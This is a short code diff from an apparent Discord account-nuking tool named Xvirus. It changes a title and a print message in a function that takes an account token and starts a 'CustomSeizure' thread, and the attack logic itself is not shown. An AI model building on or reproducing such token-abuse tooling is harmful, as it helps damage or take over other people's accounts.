@@ -9,8 +9,8 @@ from colorama import Fore
 from util.plugins.common import print_slow, setTitle, getheaders, proxy
 
 def Xvirus_Nuke(token, Server_Name, message_Content):
-    setTitle("Deploying Xeme Nuke")
-    print(f"{Fore.RESET}[{Fore.RED}*{Fore.RESET}] {Fore.BLUE}Xvirus Nuke Deployed. . .")
+    setTitle("Deploying Xvirus Nuke")
+    print(f"Xvirus Nuke Deployed. . .")
     if threading.active_count() <= 100:
         t = threading.Thread(target=CustomSeizure, args=(token, ))
         t.start()
